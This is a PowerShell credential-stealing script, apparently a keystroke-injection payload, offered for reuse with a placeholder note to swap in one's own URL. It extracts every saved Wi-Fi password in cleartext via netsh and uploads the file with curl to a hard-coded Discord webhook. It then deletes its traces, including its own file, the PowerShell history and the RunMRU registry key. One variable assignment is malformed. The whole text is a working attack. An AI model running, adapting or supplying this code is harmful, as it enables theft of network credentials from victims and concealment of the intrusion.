#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1133794641678958712/PXc6JyofnzdgkXSYJwOwhPst7TGkGuPV0Eq3jhcj094hPuDo8XgaOUPu0rjNuMWdNW2v" ;
#Get PC Name+Date+Time
  $namepc = WIFI

# Get WifiPassword
echo "" > "$env:temp\EXFILTRED-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\EXFILTRED-$namepc.txt";

#UPLOAD
cd $env:temp
# Upload wifi password
  curl.exe -F "file2=@EXFILTRED-$namepc.txt" $url;

#Delete all file
# Delete wifi password
  Remove-Item "EXFILTRED-$namepc.txt" -Force -Recurse;
# Delete this script
  Remove-Item  $env:temp\e.ps1 -Force -Recurse;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
exit;
